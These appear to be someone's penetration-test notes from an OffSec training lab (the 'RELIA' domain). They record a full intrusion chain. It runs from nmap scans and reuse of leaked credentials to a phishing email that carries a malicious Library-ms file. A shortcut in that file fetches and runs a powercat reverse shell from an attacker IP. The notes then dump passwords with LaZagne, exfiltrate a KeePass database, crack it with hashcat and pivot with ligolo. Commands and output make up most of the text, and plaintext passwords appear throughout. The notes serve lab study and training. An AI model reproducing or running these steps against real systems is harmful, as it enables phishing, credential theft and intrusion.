-a----        10/20/2022   2:01 AM            130 config
-a----        10/20/2022   2:01 AM             73 description
-a----        10/20/2022   2:01 AM             23 HEAD
-a----        10/20/2022   2:07 AM          91178 index


PS C:\staging> git log
commit 8b430c17c16e6c0515e49c4eafdd129f719fde74 (HEAD -> master)
Author: damian <damian>
Date:   Thu Oct 20 02:07:42 2022 -0700

    Email config not required anymore

commit 967fa71c359fffcbeb7e2b72b27a321612e3ad11
Author: damian <damian>
Date:   Thu Oct 20 02:06:37 2022 -0700


PS C:\staging> git show
commit 8b430c17c16e6c0515e49c4eafdd129f719fde74 (HEAD -> master)
Author: damian <damian>
Date:   Thu Oct 20 02:07:42 2022 -0700

    Email config not required anymore

diff --git a/htdocs/cms/data/email.conf.bak b/htdocs/cms/data/email.conf.bak
deleted file mode 100644
index 77e370c..0000000
--- a/htdocs/cms/data/email.conf.bak
+++ /dev/null
@@ -1,5 +0,0 @@
-Email configuration of the CMS
-maildmz@relia.com:DPuBT9tGCBrTbR
-
-If something breaks contact jim@relia.com as he is responsible for the mail server.
-Please don't send any office or executable attachments as they get filtered out for security reasons.
\ No newline at end of file


maildmz@relia.com:DPuBT9tGCBrTbR
jim@relia.com

--------------------------------------------------------------------------------------------------
				6. 192.168.238.189: 
USERS: 
Administrator
adrian
damon:i6yuT6tym@
damian
        email = damian
        name = damian

maildmz@relia.com:DPuBT9tGCBrTbR
jim@relia.com


nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 192.168.238.189

SMTP: 25, 587
25/tcp    open  smtp          syn-ack hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
587/tcp   open  smtp          syn-ack hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY

POP3: 110
110/tcp   open  pop3          syn-ack hMailServer pop3d
|_pop3-capabilities: UIDL USER TOP

IMAP:
143/tcp   open  imap          syn-ack hMailServer imapd
|_imap-capabilities: RIGHTS=texkA0001 CHILDREN NAMESPACE completed ACL IDLE CAPABILITY OK IMAP4 IMAP4rev1 QUOTA SORT

HTTP:
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0

SMB:
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
Host script results:
| smb2-time: 
|   date: 2024-04-28T05:49:37
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 18778/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 50938/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 60643/udp): CLEAN (Timeout)
|   Check 4 (port 21959/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: -2s

RPC:
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows

				SMB:
nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse -p 139,445 192.168.238.189

OathDeeplyReprieve91
fireball
password
mark:!8@aBRBYdb3!
emma:SomersetVinyl1!
HabitsAgesEnd123
sa:SAPassword_1998
welcome1
bo:Luigi=Papal1963
Michael321:12345
DotNetNukeDatabasePassword!

smbclient -L \\\\192.168.238.189\\
smbclient \\\\192.168.238.189\\SHARE
smbclient //192.168.238.189/IPC$ -N
enum4linux -n 192.168.238.189
enum4linux -a 192.168.238.189
smbmap -H 192.168.238.189

impacket-psexec mark:'!8@aBRBYdb3!'@192.168.238.189 cmd.exe
impacket-psexec emma:'SomersetVinyl1!'@192.168.238.189 cmd.exe

impacket-wmiexec LOGIN/mark:'!8@aBRBYdb3!'@192.168.238.189
impacket-wmiexec LOGIN/emma:'SomersetVinyl1!'@192.168.238.189

				RPC: 
rpcclient -U "" 192.168.238.189
	srvinfo
	enumdomusers
	getdompwinfo
	querydominfo
	netshareenum
	netshareenumall

evil-winrm -i 192.168.238.189 -u mark -p '!8@aBRBYdb3!' 
evil-winrm -i 192.168.238.189 -u emma -p 'SomersetVinyl1!' 

				HTTP: 5985, 47001
Microsoft HTTPAPI httpd 2.0
http://192.168.238.189:5985/
http://192.168.238.189:47001/
Not Found
HTTP Error 404. The requested resource is not found.

				SMTP: 25, 587
	https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp
25/tcp    open  smtp          syn-ack hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY

587/tcp   open  smtp          syn-ack hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
				POP3: 110
110/tcp   open  pop3          syn-ack hMailServer pop3d
|_pop3-capabilities: UIDL USER TOP
				IMAP:
143/tcp   open  imap          syn-ack hMailServer imapd
|_imap-capabilities: RIGHTS=texkA0001 CHILDREN NAMESPACE completed ACL IDLE CAPABILITY OK IMAP4 IMAP4rev1 QUOTA SORT


				Windows Library Files: 
RDP: WINPREP OS Credentials:
offsec / lab
xfreerdp /u:offsec /p:lab /v:192.168.238.250 /size:80% /drive:kali,.

# Starting WsgiDAV on port 80
kali@kali:~$ mkdir /home/kali/Desktop/RELIA/webdav
kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/Desktop/RELIA/webdav
# Confirm Directory
http://127.0.0.1

SAVE: .txt
config.Library-ms

<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.170</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>

					WINRMPREP:
right-click on the Desktop and select New > Shortcut

# PowerShell Download Cradle and PowerCat Reverse Shell Execution
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.170:8000/powercat.ps1');powercat -c 192.168.45.170 -p 4444 -e powershell"

# Save as
automatic_configuration

					Reverse Shell:
# Serve PowerCat
python3 -m http.server 8000

# Receive connection 
nc -nvlp 4444

					PHISHING: 
				https://www.hmailserver.com/
maildmz@relia.com:DPuBT9tGCBrTbR
jim@relia.com

-Email configuration of the CMS
-maildmz@relia.com:DPuBT9tGCBrTbR
-If something breaks contact jim@relia.com as he is responsible for the mail server.
-Please don't send any office or executable attachments as they get filtered out for security reasons.


┌──(kali㉿kali)-[~/Desktop/beyond]
└─$ nano body.txt

Hey!
I checked MAILDMZ and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

maildmz

┌──(kali㉿kali)-[~/beyond]
└─$ sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.238.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap

Username: maildmz
Password: DPuBT9tGCBrTbR

=== Trying 192.168.227.242:25...
=== Connected to 192.168.227.242.
<-  220 MAILSRV1 ESMTP
 -> EHLO kali
<-  250-MAILSRV1
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> AUTH LOGIN
<-  334 VXNlcm5hbWU6
 -> am9obg==
<-  334 UGFzc3dvcmQ6
 -> ZHFzVHdUcFpQbiNuTA==
<-  235 authenticated.
 -> MAIL FROM:<john@beyond.com>
<-  250 OK
 -> RCPT TO:<marcus@beyond.com>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> 72 lines sent
<-  250 Queued (13.078 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.

--------------------------------------------------------------------------------------------------
			172.16.198.14: (Pwn3d!)✅

			172.16.198.14: jim:Local.txt
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.170] from (UNKNOWN) [192.168.238.191] 62044
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
relia\jim

PS C:\Users\offsec\Desktop> hostname
WK01

PS C:\Users\jim\Desktop> type local.txt
type local.txt
297f0deb1954cdec1057f091d9496b4d

PS C:\Users\jim\Desktop> ipconfig
ipconfig
Windows IP Configuration
Ethernet adapter Ethernet0:
   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.198.14
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.198.254



			172.16.198.14: offsec:proof.txt
PS C:\Users> cd offsec
PS C:\Users\offsec> cd Desktop
PS C:\Users\offsec\Desktop> cat proof.txt
cat proof.txt
d5738a746476e8224e5812e2e7983c89

PS C:\Users\offsec\Downloads> systeminfo
Host Name:                 WK01
OS Name:                   Microsoft Windows 11 Pro
OS Version:                10.0.22000 N/A Build 22000
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          offsec

PS C:\Users\offsec\Downloads> net user /domain
The request will be processed at a domain controller for domain relia.com.
User accounts for \\DC02.relia.com
-------------------------------------------------------------------------------
Administrator            andrea                   anna                     
brad                     dan                      Guest                    
iis_service              internaladmin            jenny                    
jim                      krbtgt                   larry                    
maildmz                  michelle                 milana                   
mountuser  


PS C:\Users\offsec\Downloads> net group /domain
The request will be processed at a domain controller for domain relia.com.
Group Accounts for \\DC02.relia.com
-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*INTRANETRDP
*ITADMINS
*Key Admins
*Protected Users
*Read-only Domain Controllers
*Schema Admins
*WEBBYADMINS
*WKRDP

PS C:\Users\offsec\Downloads> net group /domain "Domain Controllers"
The request will be processed at a domain controller for domain relia.com.
Group name     Domain Controllers
Comment        All domain controllers in the domain
Members
-------------------------------------------------------------------------------
DC02$          

PS C:\Users\offsec\Downloads> net group /domain "Domain Admins"
The request will be processed at a domain controller for domain relia.com.
Group name     Domain Admins
Comment        Designated administrators of the domain
Members
-------------------------------------------------------------------------------
Administrator            dan                      internaladmin    


				DUMPING CREDS:
Powershell password hunting:
PS C:\Users\offsec\Downloads> (Get-PSReadlineOption).HistorySavePath
C:\Users\jim\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
PS C:\Users\offsec\Downloads> type C:\Users\jim\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
clear-history
shutdown /s
shutdown /s /t 5

PS C:\Users\offsec\Downloads> Get-ChildItem -Path C:\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue
    Directory: C:\Users\jim\Desktop
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         4/27/2024   6:13 PM             34 local.txt   

PS C:\Users\offsec\Downloads> Get-ChildItem -Path C:\ -Include proof.txt -File -Recurse -ErrorAction SilentlyContinue
    Directory: C:\Users\offsec\Desktop
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         4/27/2024   6:13 PM             34 proof.txt   

PS C:\Users\offsec\Downloads> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
    Directory: C:\Users\jim\Documents
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----        10/27/2022   1:57 AM           1998 Database.kdbx   

Get-ChildItem -Path C:\ -Include *.git -File -Recurse -ErrorAction SilentlyContinue -Force
NONE

LAZ:
PS C:\Users\offsec\Downloads> iwr -uri http://192.168.45.170:5555/LaZagne.exe -Outfile laz.exe
iwr -uri http://192.168.45.170:5555/LaZagne.exe -Outfile laz.exe
PS C:\Users\offsec\Downloads> .\laz.exe all

########## User: jim ##########
------------------- Thunderbird passwords -----------------
[+] Password found !!!
URL: imap://mail.relia.com
Login: jim
Password: Castello1!

[+] Password found !!!
URL: smtp://mail.relia.com
Login: jim
Password: Castello1!
------------------- Keepassconfig passwords -----------------
[+] Keyfile found !!!
Keyfile: No keyfile found
Database: C:\Users\jim\Documents\Database.kdbx
Type: Password

[+] 3 passwords have been found.
For more information launch it again with the -v option


PS C:\Users\offsec\Downloads> ls
    Directory: C:\Users\offsec\Downloads
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----        10/18/2022  10:57 AM        4396752 KeePass-2.52-Setup.exe                                               
-a----         4/28/2024   3:21 AM       11849245 laz.exe                                                              
-a----        10/18/2022  10:56 AM       56367064 Thunderbird Setup 102.3.3.exe 


				EXFILTRATE: .kdbx
python3 -m http.server 5555
PS C:\Users\offsec\Downloads> cd C:\Users\jim\Documents
PS C:\Users\jim\Documents> iwr -uri http://192.168.45.170:5555/reverse.exe -Outfile rev.exe
nc -nvlp 2560  
C:\Users\jim\Documents>powershell -ep bypass

PS C:\Users\jim\Documents> ls
    Directory: C:\Users\jim\Documents
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----        10/27/2022   1:57 AM           1998 Database.kdbx  

TRANSFER .ZIP: DIDNT WORK
kali㉿kali~ $ systemctl status ssh
kali㉿kali~ $ systemctl start ssh 
kali㉿kali~ $ pwd
PS C:\Users\stephanie\Desktop> scp .\Database.kdbx kali@192.168.45.170:/home/kali/Desktop
kali㉿kali~ $ systemctl kill ssh  
kali㉿kali~ $ systemctl status ssh


				PORT FORWARDING: 
┌──(kali㉿kali)-[~/…/TUNNELING/Ligolo/PROXY(ME)/ligolo-ng_proxy_0.5.2_linux_amd64]
└─$ sudo ip tuntap add user kali mode tun ligolo
[sudo] password for kali: 
                                                                                                 
┌──(kali㉿kali)-[~/…/TUNNELING/Ligolo/PROXY(ME)/ligolo-ng_proxy_0.5.2_linux_amd64]
└─$ sudo ip link set ligolo up

┌──(kali㉿kali)-[~/…/TUNNELING/Ligolo/PROXY(ME)/ligolo-ng_proxy_0.5.2_linux_amd64]
└─$ ./proxy -selfcert
WARN[0000] Using automatically generated self-signed certificates (Not recommended) 
INFO[0000] Listening on 0.0.0.0:11601 
ligolo-ng » INFO[0066] Agent joined.                                 name="RELIA\\jim@WK01" remote="192.168.238.191:62863"
ligolo-ng » session

python3 -m http.server 8000
PS C:\Users\jim\Documents> iwr -uri http://192.168.45.170:8000/agent.exe -Outfile agent.exe
PS C:\Users\jim\Documents> ./agent -connect 192.168.45.170:11601 -ignore-cert

172.16.198.14
sudo ip route add 172.16.198.0/24 dev ligolo
ip route

[Agent : RELIA\jim@WK01] » start
[Agent : RELIA\jim@WK01] » help
[Agent : RELIA\jim@WK01] » tunnel_list


				PORT SCAN: WK01 172.16.198.14 
┌──(kali㉿kali)-[~]
└─$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 172.16.198.14 

SMB:
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2024-04-28T11:20:50
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 9614/tcp): CLEAN (Timeout)
|   Check 2 (port 47196/tcp): CLEAN (Timeout)
|   Check 3 (port 10612/udp): CLEAN (Timeout)
|   Check 4 (port 59212/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

RDP:
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: WK01
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: WK01.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.22000
|_  System_Time: 2024-04-28T11:20:47+00:00
| ssl-cert: Subject: commonName=WK01.relia.com
| Issuer: commonName=WK01.relia.com
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-04-03T14:51:35
| Not valid after:  2024-10-03T14:51:35
| MD5:   e839:ff8f:8bbc:1bb5:0bb8:fe6d:c523:c0ce
| SHA-1: 5916:990e:9c3d:1327:73f3:3f63:36cc:4898:50fd:8412
|_ssl-date: 2024-04-28T11:21:26+00:00; -1s from scanner time.

RPC:
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
5040/tcp  open  unknown       syn-ack
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack Microsoft Windows RPC


RDP: DIDNT WORK
xfreerdp /u:jim /p:Castello1! /v:172.16.198.14 /size:80% /drive:kali,.
Login: jim
Password: Castello1!
Password

SMB
smbclient -L \\\\172.16.198.14\\
smbclient \\\\192.168.238.189\\SHARE
smbclient //192.168.238.189/IPC$ -N
enum4linux -n 192.168.238.189
enum4linux -a 192.168.238.189
smbmap -H 192.168.238.189
┌──(kali㉿kali)-[~]
└─$ impacket-psexec jim:'Castello1!'@172.16.198.14 cmd.exe
Impacket v0.12.0.dev1 - Copyright 2023 Fortra
[*] Requesting shares on 172.16.198.14.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.

WMI:
evil-winrm -i 172.16.198.14  -u jim -p 'Castello1!' 

RPC:
impacket-wmiexec RELIA/jim:'Castello1!'@192.168.238.191


					File Transfer:  
https://www.youtube.com/watch?v=kd0sZWI6Blc
https://portal.offsec.com/learning-paths/network-penetration-testing-essentials-pen-100/books-and-videos/modal/modules/file-transfers

SMB: Authenticated 
On Kali:
┌──(kali㉿kali)-[~/Desktop]
└─$ impacket-smbserver test . -smb2support  -username 'jim' -password 'Castello1!'

On Windows:
net use m: \\192.168.45.170\test
copy Database.kdbx m:\


CRACK: .kdbx
keepass2john Database.kdbx > keepass.hash
cat keepass.hash 
REMEVE: Database:
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
$keepass$*2*60*0*ed890395c5503e50453897e48fd2d79ece2ae3466b51b6fb941cd413f5c89b43*3edacb91f15bae05d3fd546f201cd8924676b662f6101ba57155e0f4aeae9b61*7a963146ec300519645fbc90ca4e258d*90939579da95cd23a9c90aef5a7a507d7c9ee647ed47c0fa05729a1262d7d73e*e97f9fe2f7a1efe24b054dfcb47e8edab5dd7eb96c5731f32e64a9d3a1db5dcf:mercedes1

┌──(kali㉿kali)-[~]
└─$ keepassxc

dmzadmin
SlimGodhoodMope

jim@relia.com
Castello1!


172.16.198.14

--------------------------------------------------------------------------------------------------
				7. 192.168.206.191: DMZADMIN ✅
┌──(kali㉿kali)-[~]
└─$ xfreerdp /u:dmzadmin /p:SlimGodhoodMope /v:192.168.238.191 /size:80% /drive:kali,.


proof.txt
744251dd992d2542a6b96f994eb57360

PS C:\Users\dmzadmin> whoami
login\dmzadmin

PS C:\Users\dmzadmin> hostname
login

				PORTS OPEN:
nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 192.168.168.191

HTTP: PASSWORD PROTECTED: http://192.168.168.191/ dmzadmin:SlimGodhoodMope
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=192.168.168.191


SMB:
445/tcp   open  microsoft-ds? syn-ack
Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 15790/tcp): CLEAN (Timeout)
|   Check 2 (port 4370/tcp): CLEAN (Timeout)
|   Check 3 (port 64565/udp): CLEAN (Timeout)
|   Check 4 (port 7230/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2024-04-29T00:31:45
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

RDP:
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
|_ssl-date: 2024-04-29T00:32:24+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: LOGIN
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: login.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.20348
|_  System_Time: 2024-04-29T00:31:44+00:00
| ssl-cert: Subject: commonName=login.relia.com
| Issuer: commonName=login.relia.com
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-04-07T16:54:43
| Not valid after:  2024-10-07T16:54:43
| MD5:   6905:c267:fa78:3014:588e:857e:8e5c:9fb8
| SHA-1: d7a7:fb27:c9af:85b6:7386:62f0:96a6:975c:c507:b6c8

RDP:
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC


				NETWORK: Internal Connection
PS C:\Users\dmzadmin\Documents> ipconfig /all
Windows IP Configuration
   Host Name . . . . . . . . . . . . : login
   Primary Dns Suffix  . . . . . . . : relia.com
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : Yes
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : relia.com

Ethernet adapter Ethernet0:
   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-AB-41-19
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 192.168.238.191(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.238.254
   NetBIOS over Tcpip. . . . . . . . : Enabled

Ethernet adapter Ethernet1:
   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter #2
   Physical Address. . . . . . . . . : 00-50-56-AB-E6-5A
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 172.16.198.254(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :
   DNS Servers . . . . . . . . . . . : 172.16.198.6
   NetBIOS over Tcpip. . . . . . . . : Enabled

PS C:\Users\dmzadmin\Documents> route print
===========================================================================
Interface List
 14...00 50 56 ab 41 19 ......vmxnet3 Ethernet Adapter
 16...00 50 56 ab e6 5a ......vmxnet3 Ethernet Adapter #2
  1...........................Software Loopback Interface 1
===========================================================================
IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0  192.168.238.254  192.168.238.191     16
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
     172.16.198.0    255.255.255.0         On-link    172.16.198.254    271
   172.16.198.254  255.255.255.255         On-link    172.16.198.254    271
   172.16.198.255  255.255.255.255         On-link    172.16.198.254    271
    192.168.238.0    255.255.255.0         On-link   192.168.238.191    271
  192.168.238.191  255.255.255.255         On-link   192.168.238.191    271
  192.168.238.255  255.255.255.255         On-link   192.168.238.191    271
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link   192.168.238.191    271
        224.0.0.0        240.0.0.0         On-link    172.16.198.254    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link   192.168.238.191    271
  255.255.255.255  255.255.255.255         On-link    172.16.198.254    271
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0  192.168.238.254       1
===========================================================================
IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
  1    331 ff00::/8                 On-link
===========================================================================

PS C:\Users\dmzadmin\Documents> arp -A
Interface: 192.168.238.191 --- 0xe
  Internet Address      Physical Address      Type
  192.168.238.254       00-50-56-ab-80-2c     dynamic
  192.168.238.255       ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
Interface: 172.16.198.254 --- 0x10
  Internet Address      Physical Address      Type
  172.16.198.6          00-50-56-ab-f7-0d     dynamic
  172.16.198.7          00-50-56-ab-c0-be     dynamic
  172.16.198.14         00-50-56-ab-5e-fb     dynamic
  172.16.198.15         00-50-56-ab-2b-8b     dynamic
  172.16.198.19         00-50-56-ab-41-0c     dynamic
  172.16.198.20         00-50-56-ab-ef-5c     dynamic
  172.16.198.21         00-50-56-ab-d9-99     dynamic
  172.16.198.30         00-50-56-ab-62-20     dynamic
  172.16.198.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static

PS C:\Users\dmzadmin\Documents> nslookup
Default Server:  UnKnown
Address:  172.16.198.6

				CREDS DUMP:
Powershell password hunting: NOTHING
PS C:\Users\dmzadmin\Documents> (Get-PSReadlineOption).HistorySavePath
C:\Users\dmzadmin\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
PS C:\Users\dmzadmin\Documents> type C:\Users\dmzadmin\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

Interesting Files:
PS C:\Users\dmzadmin\Documents> Get-ChildItem -Path C:\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue
PS C:\Users\dmzadmin\Documents> Get-ChildItem -Path C:\ -Include proof.txt -File -Recurse -ErrorAction SilentlyContinue
    Directory: C:\Users\dmzadmin\Desktop
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         4/27/2024   6:13 PM             34 proof.txt   

PS C:\Users\dmzadmin\Documents> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
PS C:\Users\dmzadmin\Documents> Get-ChildItem -Path C:\ -Include *.git -File -Recurse -ErrorAction SilentlyContinue -Force

LAZ: NOTHING 
PS C:\Users\dmzadmin\Documents> ./LaZagne.exe all
[+] 0 passwords have been found.
For more information launch it again with the -v option

MIMIKATZ: DIDNT WORK


			PRIV ESC: dmzadmin/Administrators
WinPEAS: 
          ͹ Users
    LOGIN\Administrator: Built-in account for administering the computer/domain
        |->Groups: Administrators
        |->Password: CanChange-NotExpi-Req
    LOGIN\dmzadmin
        |->Groups: Administrators,Users
        |->Password: CanChange-NotExpi-Req



				PORT FORWARD: 
┌──(kali㉿kali)-[~/…/TUNNELING/Ligolo/PROXY(ME)/ligolo-ng_proxy_0.5.2_linux_amd64]
└─$ sudo ip tuntap add user kali mode tun ligolo
[sudo] password for kali: 
                                                                                                 
